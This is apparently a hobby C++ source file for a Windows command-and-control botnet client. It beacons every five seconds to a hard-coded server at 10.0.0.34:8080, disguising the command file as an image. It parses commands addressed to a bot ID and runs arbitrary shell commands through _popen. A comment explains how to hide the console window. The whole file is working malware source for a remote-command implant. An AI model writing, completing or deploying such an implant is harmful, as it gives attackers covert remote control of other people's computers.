// C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <regex>
#include "curl/curl.h"
#include <stdexcept>

std::string ID = "ASAFW";

// To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
size_t getCommands(char* buff, size_t t, size_t nmemb, void* userData);
size_t executeCommands(std::vector<std::string>* list,CURL *curl);
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);

//Struct Types for command
//Command sequence: <COM: TYPE-VALUE:TYPE-VALUE....etc>
enum TYPE {
	KILL, //0-0
	CONF, //1-VAR-VAL
	GATH, //2-INF
	SHELL,// 3-0
	EXEC, //4-COMMAND
};

int main()
{
	CURL* curlHandle;
	CURLcode response;
	std::string commands;
	std::vector<std::string> commandList;
	curlHandle = curl_easy_init();

	if (curlHandle) {
		//Set C2 URL
		curl_easy_setopt(curlHandle, CURLOPT_URL, "http://10.0.0.34:8080/images/tree.jpg");
		//Set buffer length
		curl_easy_setopt(curlHandle, CURLOPT_BUFFERSIZE, 4096L);
		//Set callback function
		curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, getCommands);
		//Set callback Argument
		curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, &commands);
		//Execute easy perform
		while (true) {
			//Grab the C2 html file with easy perform
			Sleep(5000);
			response = curl_easy_perform(curlHandle);
			if (response != CURLE_OK) {
				fprintf(stderr, "Curl perform failed: %s \n", curl_easy_strerror(response));
				//Sleep for 5 seconds before checking C2 server again
				continue;
			}
			//Parse Command header
			if (parseCommands(&commandList, commands) == -1) {
				commands = "";
				continue;
			}
			commands = "";
			//Execute commangs grabbed
			executeCommands(&commandList,curlHandle);
			//Sleep for 5 seconds before checking C2 server again
			Sleep(5000);
			

		}

	}
	else {
		fprintf(stderr, "Failed to init curl handle");
	}
	return 0;
}

size_t getCommands(char *buff, size_t t, size_t nmemb, void* userData) {
	//Pattern to grep for (C2 command will begin with "COM"
	std::regex pattern("COM.*>");
	//smatch variable to store commands identified in
	std::smatch match;
	//convert buff to string for analysis
	//Message from server (Will contain Command and unique bot ID)
	std::string value(buff,nmemb);
	//Store message attributes in list
	//std::vector<std::string>* list = (std::vector<std::string> *)userData;
	std::string* commands = (std::string*)userData;
	//Search for command parameter
	if (std::regex_search(value, match, pattern)) {
		*commands = match[0];
	}
	//system(command.c_str());
	return nmemb;
}

//Parse Command Header
size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
	int currentPos = 0;
	int nextPos = 0;
	currentPos = commandHeader.find_first_of(":");
	if (currentPos == std::string::npos) {
		return -1;
	}
	while (currentPos != std::string::npos) {
		nextPos = commandHeader.find_first_of(":", currentPos + 1);
		if (nextPos == std::string::npos) {
			commandList->push_back(commandHeader.substr(currentPos + 1, commandHeader.length() - currentPos-2));
			break;
		}
		commandList->push_back(commandHeader.substr(currentPos + 1, nextPos - currentPos - 1));
		currentPos = nextPos;
	}
	return 0;
}
//Execute Commands
size_t executeCommands(std::vector<std::string>* list, CURL* curl) {
	std::string varName;
	std::string varValue;
	//Iterate through commands and call them (Will need parsing later);
	for (auto n : *list) {
		if (n.find_first_of("-") == std::string::npos && n == list->at(0)){
			if (n == ID || n == "ALL") {
				continue;
			}
			else {
				break;
			}
		}
		//Get Type and Value of each command
		int type = std::stoi(n.substr(0, n.find_first_of("-")));
		std::string value = n.substr(n.find_first_of('-') + 1, n.length());
		switch (type) {
			case KILL:
				exit(0);
				break;
			case CONF:
				varName = value.substr(0, value.find_first_of("-"));
				varValue = value.substr(value.find_first_of('-') + 1, value.length());
				if (varName == "url") {
					std::string url = "http://10.0.0.34:8080/images/" + varValue;
					curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				}
				break;
			case GATH:
				break;
			case SHELL:
				break;
			case EXEC:
				char buff[4096];
				std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(value.c_str(), "rt"), &_pclose);
				if (!pipe) {
					fprintf(stderr, "Popen failed");
				}
				else {
					while (fgets(buff, sizeof(buff), pipe.get()) != nullptr) {
						OutputDebugStringA(buff);
					}
				}
				printf("YAY");
				break;
		}


		//Call System Commands
	}
	list->clear();

	return true;
}


